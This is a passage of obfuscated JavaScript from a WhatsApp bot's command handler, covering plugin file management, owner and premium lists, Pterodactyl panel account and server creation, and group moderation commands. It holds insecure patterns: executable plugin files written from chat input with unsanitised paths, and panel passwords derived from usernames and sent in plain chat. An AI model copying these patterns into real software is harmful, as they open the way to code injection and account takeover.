            if (!_0x4bc4e8) {
              return;
            }
            _0x8fddfa.public = false;
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "addplug":
          {
            if (!_0x4bc4e8) {
              return;
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            if (!q.includes("|")) {
              return _0xb7106b("Add input, Example: \n\n*.plugin name|category|content*");
            }
            const [_0x41ba54, _0x38191d, ..._0x24e5b9] = q.split("|");
            const _0x22ce4f = path.join(path.resolve(__dirname, "./plugin", _0x38191d));
            const _0x5cd285 = path.join(_0x22ce4f, _0x41ba54 + ".js");
            if (!q.includes("|") || _0x24e5b9.length === 0 || fs.existsSync(_0x5cd285)) {
              return;
            }
            if (!fs.existsSync(_0x22ce4f)) {
              fs.mkdirSync(_0x22ce4f, {
                recursive: true
              });
            }
            fs.writeFileSync(_0x5cd285, _0x24e5b9.join("|"));
            await _0xb7106b("A new plugin has been created in " + _0x5cd285 + ".");
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "cgplug":
          {
            if (!_0x4bc4e8) {
              return;
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            if (!q.includes("|")) {
              return _0xb7106b("Add Input, Example: *.cgplug thisplug|newcontent*");
            }
            let [_0x5181cb, ..._0x529cd9] = q.split("|");
            let _0x4ed149 = _0x529cd9.join("|");
            let _0x5b0422 = path.resolve(__dirname, "./plugin");
            let _0x160344 = _0x544863(_0x5b0422);
            for (const _0x395331 of _0x160344) {
              if (_0x395331.command.includes(_0x5181cb)) {
                let _0x213684 = _0x395331.filePath;
                fs.writeFileSync(_0x213684, _0x4ed149);
                await _0xb7106b("Plugin in " + _0x213684 + " has been replaced");
                return;
              }
            }
            await _0xb7106b("Plugin with command '" + _0x5181cb + "' not found");
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "rmplug":
          {
            if (!_0x4bc4e8) {
              return;
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            if (!q) {
              return _0xb7106b("Please provide the command name of the plugin you want to remove. Example: \n\n*.rmplug thisplug*");
            }
            let _0x408b14 = path.resolve(__dirname, "./plugin");
            let _0x1bf972 = _0x544863(_0x408b14);
            for (const _0x47942a of _0x1bf972) {
              if (_0x47942a.command.includes(q)) {
                let _0x1ed34b = _0x47942a.filePath;
                fs.unlinkSync(_0x1ed34b);
                await _0xb7106b("Plugin in " + _0x1ed34b + " has been deleted.");
                return;
              }
            }
            await _0xb7106b("Plugin with command '" + q + "' not found.");
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "getplug":
          {
            if (!_0x4bc4e8) {
              return;
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            if (!q) {
              return _0xb7106b("Add Input, Example: \n\n*.getplug promote*");
            }
            let _0x3e16c4 = path.resolve(__dirname, "./plugin");
            let _0x5d770c = _0x544863(_0x3e16c4).find(_0x31c9eb => _0x31c9eb.command.includes(q));
            if (!_0x5d770c) {
              return _0xb7106b("Plugin with command '" + q + "' not found.");
            }
            await _0x8fddfa.sendMessage(_0x4678cc.chat, {
              document: fs.readFileSync(_0x5d770c.filePath),
              fileName: path.basename(_0x5d770c.filePath),
              mimetype: "*/*"
            }, {
              quoted: _0x4678cc
            });
            await _0xb7106b("Successfully downloaded the plugin '" + q + "', plugin has been sent.");
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "delowner":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!q) {
              return _0xb7106b("Use ." + _0x4db331 + " 916909137213");
            }
            let _0x2909aa = q.replace(/[^0-9]/g, "");
            if (_0x2909aa.startsWith("0")) {
              return _0xb7106b("Number start with 0. Replace with a number starting with the country code.\n\nExample : ." + _0x4db331 + " 916909137213");
            }
            let _0x1b15d3 = _0x353f5e.indexOf(_0x2909aa);
            if (_0x1b15d3 > -1) {
              _0x353f5e.splice(_0x1b15d3, 1);
              fs.writeFileSync(path.resolve(__dirname, "../trashbase/dtbs/owner.json"), JSON.stringify(_0x353f5e), "utf8");
              _0xb7106b("Owner successfully deleted");
            } else {
              _0xb7106b("Number not found in owner list");
            }
          }
          break;
        case "delprem":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!q) {
              return _0xb7106b("Use ." + _0x4db331 + " 916909137213");
            }
            let _0x2de978 = q.replace(/[^0-9]/g, "");
            if (_0x2de978.startsWith("0")) {
              return _0xb7106b("The number starts with 0. Replace it with a number starting with the country code.\n\nExample : ." + _0x4db331 + " 916909137213");
            }
            let _0x337a85 = _0x219360.indexOf(_0x2de978);
            if (_0x337a85 > -1) {
              _0x219360.splice(_0x337a85, 1);
              fs.writeFileSync(path.resolve(__dirname, "../trashbase/dtbs/premium.json"), JSON.stringify(_0x219360), "utf8");
              _0xb7106b("Premium user successfully deleted");
            } else {
              _0xb7106b("Number not found in premium user list");
            }
          }
          break;
        case "addowner":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!q) {
              return _0xb7106b("Use ." + _0x4db331 + " 916909137213");
            }
            let _0x38b108 = q.replace(/[^0-9]/g, "");
            if (_0x38b108.startsWith("0")) {
              return _0xb7106b("The number starts with 0. Replace it with a number starting with the country code.\n\nExample : ." + _0x4db331 + " 916909137213");
            }
            let _0x2e025f = _0x38b108 + "@s.whatsapp.net";
            let _0x54f11b = "\nYou have now gained owner access to the bot.\n";
            _0x353f5e.push(_0x38b108);
            fs.writeFileSync(path.resolve(__dirname, "../trashbase/dtbs/owner.json"), JSON.stringify(_0x353f5e), "utf8");
            _0xb7106b("Successfully added to owner list");
            await _0xa791c(5000);
            const _0x119895 = {
              quoted: _0x4678cc
            };
            await _0x8fddfa.sendMessage(_0x2e025f, {
              contextInfo: {
                mentionedJid: [_0x2e025f],
                externalAdReply: {
                  showAdAttribution: false,
                  renderLargerThumbnail: false,
                  title: "# Addprem - " + _0x2e025f,
                  previewType: "VIDEO",
                  sourceUrl: "" + global.url,
                  mediaUrl: "" + global.url
                }
              },
              text: _0x54f11b
            }, _0x119895);
          }
          break;
        case "addprem":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!q) {
              return _0xb7106b("Use ." + _0x4db331 + " 916909137213");
            }
            let _0x75b9d0 = q.replace(/[^0-9]/g, "");
            if (_0x75b9d0.startsWith("0")) {
              return _0xb7106b("The number starts with 0. Replace it with a number starting with the country code.\n\nExample : ." + _0x4db331 + " 916909137213");
            }
            let _0x4caf57 = _0x75b9d0 + "@s.whatsapp.net";
            let _0x50b226 = "\nYou have now gained premium access to the bot.\n";
            _0x219360.push(_0x75b9d0);
            fs.writeFileSync(path.resolve(__dirname, "../trashbase/dtbs/premium.json"), JSON.stringify(_0x219360), "utf8");
            _0xb7106b("Successfully added to premium list");
            await _0xa791c(5000);
            const _0x953514 = {
              quoted: _0x4678cc
            };
            await _0x8fddfa.sendMessage(_0x4caf57, {
              contextInfo: {
                mentionedJid: [_0x4caf57],
                externalAdReply: {
                  showAdAttribution: false,
                  renderLargerThumbnail: false,
                  title: "# Addprem - " + _0x4caf57,
                  previewType: "VIDEO",
                  sourceUrl: "" + global.url,
                  mediaUrl: "" + global.url
                }
              },
              text: _0x50b226
            }, _0x953514);
          }
          break;
        case "ping":
        case "p":
          {
            const _0x4fc300 = new Date();
            const _0x146d71 = await _0x8fddfa.sendMessage(_0x4678cc.chat, {
              text: "Speed"
            });
            await _0x8fddfa.relayMessage(_0x4678cc.chat, {
              protocolMessage: {
                key: _0x146d71.key,
                type: 14,
                editedMessage: {
                  conversation: "Speed: *" + (new Date() - _0x4fc300) + "* ms "
                }
              }
            }, {});
          }
          break;
        case "runtime":
          let _0x3aa782 = "The bot has been active for " + _0x196fe8(process.uptime());
          const _0x165453 = {
            showAdAttribution: true,
            title: namabot,
            body: NamaOwner,
            thumbnailUrl: "https://i.ibb.co/kSs1stX/thumb.jpg",
            sourceUrl: "https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20",
            mediaType: 1,
            renderLargerThumbnail: true
          };
          const _0x47cc6d = {
            externalAdReply: _0x165453
          };
          const _0x3ef913 = {
            text: _0x3aa782,
            contextInfo: _0x47cc6d
          };
          _0x8fddfa.sendMessage(_0x4678cc.chat, _0x3ef913, {
            quoted: _0x4678cc
          });
          break;
        case "addsrv":
          {
            if (!_0x4bc4e8) {
              return _0xb7106b("You are not my owner");
            }
            let _0x2596b3 = _0x1b2127.split(",");
            if (_0x2596b3.length < 7) {
              return reply("> *Incorrect format!*\n\n❗ Usage:\n" + (_0x2fafb3 + _0x4db331) + " panel name, date, user ID you want to add the server to, eggId, locationId, memory/disk, cpu\n\n`✅ Example` : addsrv dgxeon,26 December 2018,1,15,1,0/0,0\n");
            }
            let _0x561708 = _0x2596b3[0];
            let _0x285c53 = _0x2596b3[1] || "";
            let _0x1db80a = _0x2596b3[2];
            let _0x55f2f4 = _0x2596b3[3];
            let _0x41f4a1 = _0x2596b3[4];
            let _0x3ce273 = _0x2596b3[5].split`/`;
            let _0x3bdcaa = _0x2596b3[6];
            let _0x222477 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x55f2f4, {
              method: "GET",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + apikey
              }
            });
            let _0x25c62d = await _0x222477.json();
            let _0xb5a586 = _0x25c62d.attributes.startup;
            const _0x2c8b21 = {
              memory: _0x3ce273[0],
              swap: 0,
              disk: _0x3ce273[1],
              io: 500,
              cpu: _0x3bdcaa
            };
            let _0x4ab8fa = await fetch(domain + "/api/application/servers", {
              method: "POST",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + apikey
              },
              body: JSON.stringify({
                name: _0x561708 + " King-Sam",
                description: "Created by " + namabot,
                user: _0x1db80a,
                egg: parseInt(_0x55f2f4),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_19",
                startup: _0xb5a586,
                environment: {
                  INST: "npm",
                  USER_UPLOAD: "0",
                  AUTO_UPDATE: "0",
                  CMD_RUN: "npm start"
                },
                limits: _0x2c8b21,
                feature_limits: {
                  databases: 5,
                  backups: 5,
                  allocations: 5
                },
                deploy: {
                  locations: [parseInt(_0x41f4a1)],
                  dedicated_ip: false,
                  port_range: []
                }
              })
            });
            let _0x30635b = await _0x4ab8fa.json();
            if (_0x30635b.errors) {
              return reply(JSON.stringify(_0x30635b.errors[0], null, 2));
            }
            let _0x499ed5 = _0x30635b.attributes;
            _0xb7106b("\n❗ *SUCCESSFULLY ADD SERVER*\n\nTYPE: `" + _0x30635b.object + "`\n\nID: `" + _0x499ed5.id + "`\nUUID: " + _0x499ed5.uuid + "`\nNAME: " + _0x499ed5.name + "`\nDESCRIPTION: `" + _0x499ed5.description + "`\nMEMORY: `" + (_0x499ed5.limits.memory === 0 ? "Unlimited" : _0x499ed5.limits.memory) + " MB`\nDISK: `" + (_0x499ed5.limits.disk === 0 ? "Unlimited" : _0x499ed5.limits.disk) + " MB`\nCPU: `" + _0x499ed5.limits.cpu + "%`\nCREATED AT: " + _0x499ed5.created_at + "`");
          }
          break;
        case "unli":
          {
            if (!_0x4bc4e8) {
              return _0xb7106b("You cannot get a panel because u are not a owner");
            }
            let _0xe042e4 = _0x1b2127.split(",");
            if (_0xe042e4.length < 2) {
              return reply("use:\n" + (_0x2fafb3 + _0x4db331) + " user,number");
            }
            let _0x15d4bb = _0xe042e4[0];
            let _0x11a2e4 = _0x4678cc.quoted ? _0x4678cc.quoted.sender : _0xe042e4[1] ? _0xe042e4[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4678cc.mentionedJid[0];
            let _0x1662f3 = _0x15d4bb;
            let _0x2e5443 = global.eggsnya;
            let _0x29571f = global.location;
            let _0x43c117 = "0";
            let _0xd4ab6c = "0";
            let _0x12700b = "0";
            let _0x267144 = _0x15d4bb + "dreamguy@xeon.ez";
            akunlo = "https://i.ibb.co/Wppj16p/cheemspic.jpg";
            if (!_0x11a2e4) {
              return;
            }
            let _0x8b17d2 = (await _0x8fddfa.onWhatsApp(_0x11a2e4.split`@`[0]))[0] || {};
            let _0x21cd55 = _0x15d4bb + "001";
            const _0x4bde7f = {
              email: _0x267144,
              username: _0x15d4bb,
              first_name: _0x15d4bb,
              last_name: _0x15d4bb,
              language: "en",
              password: _0x21cd55
            };
            let _0x216e56 = await fetch(domain + "/api/application/users", {
              method: "POST",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + apikey
              },
              body: JSON.stringify(_0x4bde7f)
            });
            let _0x35fc72 = await _0x216e56.json();
            if (_0x35fc72.errors) {
              return _0xb7106b(JSON.stringify(_0x35fc72.errors[0], null, 2));
            }
            let _0x52b98e = _0x35fc72.attributes;
            let _0xd43ef6 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2e5443, {
              method: "GET",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + apikey
              }
            });
            _0xb7106b("User ID: " + _0x52b98e.id);
            let _0xc498c9 = "❗Hello @" + _0x4678cc.sender.split("@")[0] + " ,Just Gave You Access To The Following Account Panel > >\n\n👤 Username: " + _0x52b98e.username + "\n🔐 Password: " + _0x21cd55 + "\n🔗 Url: " + domain;
            const _0x11e7dc = {
              image: {
                url: "https://i.ibb.co/Wppj16p/cheemspic.jpg"
              },
              caption: _0xc498c9
            };
            const _0x5476d3 = {
              quoted: _0x4678cc
            };
            _0x8fddfa.sendMessage(_0x11a2e4, _0x11e7dc, _0x5476d3);
            let _0x58f4ac = await _0xd43ef6.json();
            let _0x582489 = _0x58f4ac.attributes.startup;
            const _0x31d5dd = {
              memory: _0x43c117,
              swap: 0,
              disk: _0x12700b,
              io: 500,
              cpu: _0xd4ab6c
            };
            let _0x624763 = await fetch(domain + "/api/application/servers", {
              method: "POST",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + apikey
              },
              body: JSON.stringify({
                name: _0x1662f3 + " - Unlimited",
                description: "Create with " + namabot,
                user: _0x52b98e.id,
                egg: parseInt(_0x2e5443),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: _0x582489,
                environment: {
                  INST: "npm",
                  USER_UPLOAD: "0",
                  AUTO_UPDATE: "0",
                  CMD_RUN: "npm start"
                },
                limits: _0x31d5dd,
                feature_limits: {
                  databases: 5,
                  backups: 5,
                  allocations: 5
                },
                deploy: {
                  locations: [parseInt(_0x29571f)],
                  dedicated_ip: false,
                  port_range: []
                }
              })
            });
            let _0x2d8781 = await _0x624763.json();
            if (_0x2d8781.errors) {
              return reply(JSON.stringify(_0x2d8781.errors[0], null, 2));
            }
            let _0x105cf8 = _0x2d8781.attributes;
            let _0x3dd8b2 = await _0xb7106b("Succeful added user and server\n\nType: user\n\nId: " + _0x52b98e.id + "\nUsername: " + _0x52b98e.username + "\nEmail: " + _0x52b98e.email + "\nName: " + _0x52b98e.first_name + " " + _0x52b98e.last_name + "\nMemory: " + (_0x105cf8.limits.memory === 0 ? "Unlimited" : _0x105cf8.limits.memory) + " MB\nDisk: " + (_0x105cf8.limits.disk === 0 ? "Unlimited" : _0x105cf8.limits.disk + "MB") + "\nCpu: " + (_0x105cf8.limits.cpu === 0 ? "Unlimited" : _0x105cf8.limits.cpu + "%"));
          }
          break;
        case "2gb":
          {
            if (!_0x4bc4e8) {
              reply("You are not my owner");
            }
            if (!_0x4bc4e8) {
              return reply(mess.owner);
            }
            let _0x41ec1e = _0x1b2127.split(",");
            if (_0x41ec1e.length < 2) {
              return reply("Incorrect format!\nUse:\n" + (_0x2fafb3 + _0x4db331) + " user,nomer");
            }
            let _0x511e96 = _0x41ec1e[0];
            let _0x1d8b1b = _0x4678cc.quoted ? _0x4678cc.quoted.sender : _0x41ec1e[1] ? _0x41ec1e[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4678cc.mentionedJid[0];
            let _0x4734e6 = _0x511e96;
            let _0x4cca8b = global.eggsnya;
            let _0x2bc216 = global.location;
            let _0x5d34ae = "2024";
            let _0x193124 = "70";
            let _0x127da9 = "2024";
            let _0xa23a08 = _0x511e96 + "@sweetrabit.ml";
            akunlo = "https://i.ibb.co/Wppj16p/cheemspic.jpg";
            if (!_0x1d8b1b) {
              return;
            }
            let _0x5e2863 = (await _0x8fddfa.onWhatsApp(_0x1d8b1b.split`@`[0]))[0] || {};
            let _0x352f86 = _0x511e96 + "001";
            const _0x20b798 = {
              email: _0xa23a08,
              username: _0x511e96,
              first_name: _0x511e96,
              last_name: _0x511e96,
              language: "en",
              password: _0x352f86
            };
            let _0x4a494f = await fetch(domain + "/api/application/users", {
              method: "POST",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + apikey
              },
              body: JSON.stringify(_0x20b798)
            });
            let _0x144cd8 = await _0x4a494f.json();
            if (_0x144cd8.errors) {
              return reply(JSON.stringify(_0x144cd8.errors[0], null, 2));
            }
            let _0x1284e3 = _0x144cd8.attributes;
            let _0x56143e = await fetch(domain + "/api/application/nests/5/eggs/" + _0x4cca8b, {
              method: "GET",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + apikey
              }
            });
            _0xb7106b("User ID: " + _0x1284e3.id);
            let _0x20278e = "❗Hello @" + _0x4678cc.sender.split("@")[0] + " , Owner Just Gave You Access To The Following Panel Account >\n\n👤 Username: " + _0x1284e3.username + "\n🔐 Password: " + _0x352f86 + "\n🔗 Url: " + domain;
            const _0x5607e6 = {
              image: {
                url: "https://i.ibb.co/Wppj16p/cheemspic.jpg"
              },
              caption: _0x20278e
            };
            const _0x50e7a0 = {
              quoted: _0x4678cc
            };
            _0x8fddfa.sendMessage(_0x1d8b1b, _0x5607e6, _0x50e7a0);
            let _0xfdc672 = await _0x56143e.json();
            let _0x221bd5 = _0xfdc672.attributes.startup;
            const _0x114c14 = {
              memory: _0x5d34ae,
              swap: 0,
              disk: _0x127da9,
              io: 500,
              cpu: _0x193124
            };
            let _0x1e87b9 = await fetch(domain + "/api/application/servers", {
              method: "POST",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + apikey
              },
              body: JSON.stringify({
                name: _0x4734e6 + " - 2gb",
                description: "Create with " + namabot,
                user: _0x1284e3.id,
                egg: parseInt(_0x4cca8b),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: _0x221bd5,
                environment: {
                  INST: "npm",
                  USER_UPLOAD: "0",
                  AUTO_UPDATE: "0",
                  CMD_RUN: "npm start"
                },
                limits: _0x114c14,
                feature_limits: {
                  databases: 5,
                  backups: 5,
                  allocations: 5
                },
                deploy: {
                  locations: [parseInt(_0x2bc216)],
                  dedicated_ip: false,
                  port_range: []
                }
              })
            });
            let _0x3ee0be = await _0x1e87b9.json();
            if (_0x3ee0be.errors) {
              return reply(JSON.stringify(_0x3ee0be.errors[0], null, 2));
            }
            let _0x571f06 = _0x3ee0be.attributes;
            let _0x598283 = await _0xb7106b("Successfully added User and Server\n\nType: user\n\nId: " + _0x1284e3.id + "\nUsername: " + _0x1284e3.username + "\nEmail: " + _0x1284e3.email + "\nName: " + _0x1284e3.first_name + " " + _0x1284e3.last_name + "\nMemory: " + (_0x571f06.limits.memory === 0 ? "Unlimited" : _0x571f06.limits.memory) + " MB\nDisk: " + (_0x571f06.limits.disk === 0 ? "Unlimited" : _0x571f06.limits.disk + "MB") + "\nCpu: " + (_0x571f06.limits.cpu === 0 ? "Unlimited" : _0x571f06.limits.cpu + "%"));
          }
          break;
        case "join":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!_0x1b2127) {
              return _0xb7106b("Masuk Link Grup!");
            }
            if (!_0x1d0b5d(_0xd16396[0]) && !_0xd16396[0].includes("whatsapp.com")) {
              return "Link Invalid!";
            }
            _0xb7106b(mess.wait);
            let _0x42a386 = _0xd16396[0].split("https://chat.whatsapp.com/")[1];
            await _0x8fddfa.groupAcceptInvite(_0x42a386).then(_0x8d847e => _0xb7106b(_0x32f2ff(_0x8d847e))).catch(_0xf11a2a => _0xb7106b(_0x32f2ff(_0xf11a2a)));
          }
          break;
        case "block":
          {
            if (!_0x4bc4e8) {
              return;
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            let _0x500885 = _0x4678cc.mentionedJid[0] ? _0x4678cc.mentionedJid[0] : _0x4678cc.quoted ? _0x4678cc.quoted.sender : _0x1b2127.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            _0x500885 = _0x500885 || _0x4678cc.chat;
            if (_0x500885.includes("@g.us")) {
              return _0xb7106b("Loh, @g.us ? 🧐");
            }
            await _0x8fddfa.updateBlockStatus(_0x500885, "block").then(_0x81431f => _0xb7106b(_0x32f2ff(_0x81431f))).catch(_0x45bd7a => _0xb7106b(_0x32f2ff(_0x45bd7a)));
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "unblock":
          if (!_0x4bc4e8) {
            return;
          }
          let _0x16b1cb = _0x4678cc.quoted ? _0x4678cc.quoted.sender : _0x1b2127.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          if (_0x5a4663) {
            if (_0x16b1cb) {
              await _0x8fddfa.updateBlockStatus(_0x16b1cb, "unblock");
              await _0xb7106b("Sukses unblock user");
            } else if (!q) {
              _0xb7106b("Please reply to the message or tag or input the number you want to block.");
            }
          } else if (!_0x5a4663) {
            if (q) {
              let _0x3a3360 = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
              if (_0x3a3360.startsWith("08")) {
                return _0xb7106b("Awali nomer dengan 62");
              }
              if (!_0x3a3360.startsWith("62")) {
                return _0xb7106b("Please reply to the message or tag or input the number you want to block.");
              }
              await _0x8fddfa.updateBlockStatus(_0x3a3360, "unblock");
              _0xb7106b("Sukses unblock " + _0x3a3360);
            } else if (!q) {
              _0xb7106b("Enter the number you want to unblock");
            }
          }
          break;
        case "listblock":
          {
            let _0x116244 = await _0x8fddfa.fetchBlocklist();
            _0xb7106b("List Block :\n\n" + ("Total : " + (_0x116244 == undefined ? "*0* Diblokir" : "*" + _0x116244.length + "* Blocked") + "\n") + _0x116244.map(_0x55d9f7 => "• " + _0x55d9f7.replace(/@.+/, "")).join`\n`);
          }
          break;
        case "setppbot":
          {
            if (!_0x4bc4e8) {
              return;
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            if (_0x4678cc.quoted) {
              const _0x359e28 = await _0x8fddfa.downloadAndSaveMediaMessage(_0xe724ae);
              const {
                img: _0x19c901
              } = await _0x463828(_0x359e28);
              const _0x18c19b = {
                to: _0x488786,
                type: "set",
                xmlns: "w:profile:picture"
              };
              const _0x34adfb = {
                tag: "picture",
                attrs: {},
                content: _0x19c901
              };
              _0x34adfb.attrs.type = "image";
              const _0x49fbe8 = {
                tag: "iq",
                attrs: _0x18c19b,
                content: [_0x34adfb]
              };
              await _0x8fddfa.query(_0x49fbe8);
              await _0xb7106b("" + mess.success);
              await _0x1ddb27(_0x4678cc.chat, "✅");
            } else {
              _0xb7106b("Reply to the photo");
            }
          }
          break;
        case "delppbot":
          {
            if (!_0x4bc4e8) {
              return;
            }
            _0x8fddfa.removeProfilePicture(_0x8fddfa.user.id);
            _0xb7106b(mess.succes);
          }
          break;
        case "setbiobot":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!q) {
              return _0xb7106b("Send command " + (_0x2fafb3 + _0x4db331) + " text\n\nExample : " + _0x4db331 + " Yo");
            }
            await _0x8fddfa.updateProfileStatus(q);
            await _0xb7106b("Successfully changed bio status to *" + q + "*");
          }
          break;
        case "leavegc":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!_0x5a4663) {
              return;
            }
            await _0x8fddfa.groupLeave(_0x4678cc.chat);
          }
          break;
        case "setppgroup":
        case "setppgrup":
        case "setppgc":
          {
            if (!_0x4bc4e8) {
              return _0xb7106b(mess.usingsetpp);
            }
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            if (!_0xb1d3ee) {
              return _0xb7106b(mess.admin);
            }
            if (!/image/.test(_0x2bf9d0)) {
              return _0xb7106b("Send/Reply Image With Caption " + (_0x2fafb3 + _0x4db331));
            }
            if (/webp/.test(_0x2bf9d0)) {
              return _0xb7106b("Send/Reply Image With Caption " + (_0x2fafb3 + _0x4db331));
            }
            let _0x393d3c = await _0x8fddfa.downloadAndSaveMediaMessage(_0x4678cc);
            const _0x51794b = {
              url: _0x393d3c
            };
            await _0x8fddfa.updateProfilePicture(_0x4678cc.chat, _0x51794b).catch(_0x81faef => fs.unlinkSync(_0x393d3c));
            _0xb7106b("done");
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "editsubjek":
          {
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            if (!_0x2f1e33) {
              return _0xb7106b(mess.notadmin);
            }
            if (!q) {
              return _0xb7106b("Example *" + (_0x2fafb3 + _0x4db331) + " penis*");
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            await _0x8fddfa.groupUpdateSubject(_0x4678cc.chat, _0x1b2127);
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "editdesk":
          {
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            if (!_0x2f1e33) {
              return _0xb7106b(mess.notadmin);
            }
            if (!q) {
              return _0xb7106b("Example *" + (_0x2fafb3 + _0x4db331) + " penis*");
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            await _0x8fddfa.groupUpdateDescription(_0x4678cc.chat, _0x1b2127);
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "linkgroup":
        case "linkgc":
          {
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            if (!_0x2f1e33) {
              return _0xb7106b(mess.notadmin);
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            let _0x2c4955 = await _0x8fddfa.groupInviteCode(_0x4678cc.chat);
            _0x8fddfa.sendText(_0x4678cc.chat, "https://chat.whatsapp.com/" + _0x2c4955 + "\n\nLink Group : " + _0x136482.subject, _0x4678cc, {
              detectLink: true
            });
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "resetlinkgc":
        case "revoke":
          {
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            if (!_0x2f1e33) {
              return _0xb7106b(mess.notadmin);
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            _0x8fddfa.groupRevokeInvite(_0x4678cc.chat);
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "linkgc":
          {
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            if (!_0x2f1e33) {
              return _0xb7106b(mess.notadmin);
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            let _0x23bda1 = await _0x8fddfa.groupInviteCode(_0x4678cc.chat);
            _0xb7106b("https://chat.whatsapp.com/" + _0x23bda1 + "\n\nLink Group : " + _0x136482.subject);
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "kick":
          {
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            if (!_0x2f1e33) {
              return _0xb7106b(mess.notadmin);
            }
            if (!_0xb1d3ee) {
              return _0xb7106b(mess.admin);
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            let _0x217700 = _0x4678cc.mentionedJid[0] ? _0x4678cc.mentionedJid[0] : _0x4678cc.quoted ? _0x4678cc.quoted.sender : _0x1b2127.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            await _0x8fddfa.groupParticipantsUpdate(_0x4678cc.chat, [_0x217700], "remove");
            _0xb7106b(mess.done);
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "add":
          {
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            if (!_0x2f1e33) {
              return _0xb7106b(mess.notadmin);
            }
            if (!_0xb1d3ee) {
              return _0xb7106b(mess.admin);
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            let _0xe7658c = _0x4678cc.quoted ? _0x4678cc.quoted.sender : _0x1b2127.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            await _0x8fddfa.groupParticipantsUpdate(_0x4678cc.chat, [_0xe7658c], "add");
            _0xb7106b(mess.done);
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "promote":
          {
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            if (!_0x2f1e33) {
              return _0xb7106b(mess.notadmin);
            }
            if (!_0xb1d3ee) {
              return _0xb7106b(mess.admin);
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            let _0x2a7ece = _0x4678cc.mentionedJid[0] ? _0x4678cc.mentionedJid[0] : _0x4678cc.quoted ? _0x4678cc.quoted.sender : _0x1b2127.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            await _0x8fddfa.groupParticipantsUpdate(_0x4678cc.chat, [_0x2a7ece], "promote");
            _0xb7106b(mess.done);
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "demote":
          {
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            if (!_0x2f1e33) {
              return _0xb7106b(mess.notadmin);
            }
            if (!_0xb1d3ee) {
              return _0xb7106b(mess.admin);
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            let _0x53cee5 = _0x4678cc.mentionedJid[0] ? _0x4678cc.mentionedJid[0] : _0x4678cc.quoted ? _0x4678cc.quoted.sender : _0x1b2127.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
